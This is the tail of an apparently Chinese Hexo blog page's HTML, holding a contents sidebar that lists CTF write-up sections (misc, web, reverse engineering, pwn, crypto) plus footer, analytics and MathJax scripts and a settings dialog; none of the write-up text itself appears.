</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="toc-sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#picture"><span class="nav-number">1.1.</span> <span class="nav-text">picture</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Noise"><span class="nav-number">1.2.</span> <span class="nav-text">Noise</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#X-man-Keyword"><span class="nav-number">1.3.</span> <span class="nav-text">X-man-Keyword</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#X-man-A-face"><span class="nav-number">1.4.</span> <span class="nav-text">X-man-A face</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Lottery"><span class="nav-number">2.1.</span> <span class="nav-text">Lottery</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NewsCenter"><span class="nav-number">2.2.</span> <span class="nav-text">NewsCenter</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RE"><span class="nav-number">3.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Xman-babymips"><span class="nav-number">3.1.</span> <span class="nav-text">Xman-babymips</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#asong"><span class="nav-number">3.2.</span> <span class="nav-text">asong</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">4.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Xman-dice-game"><span class="nav-number">4.1.</span> <span class="nav-text">Xman-dice_game</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Xan-stack2"><span class="nav-number">4.2.</span> <span class="nav-text">Xan-stack2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">5.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyRSA"><span class="nav-number">5.1.</span> <span class="nav-text">babyRSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Xman-RSA"><span class="nav-number">5.2.</span> <span class="nav-text">Xman-RSA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">6.</span> <span class="nav-text">参考网站</span></a></li></ol>
    
    </div>
  </aside>
</section>
        
      </div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2017 - 2018 AssassinQ All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				UV : <span id="busuanzi_value_site_uv"></span> |  
				PV : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/links" class="mobile-nav-link">Links</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/scripts.js"></script>




  <script src="/js/dialog.js"></script>








	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>



	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">设置</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              正文字号大小
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            您已调整页面字体大小
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              夜间护眼模式
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            夜间模式已经开启，再次单击按钮即可关闭 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            AssassinQ
          </div>
          <div class="panel-body">
            Copyright © 2018 Q14NF3111 All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
  
  <!-- 页面点击小红心 -->
  <script type="text/javascript" src="/js/love.js"></script>
</body>
</html>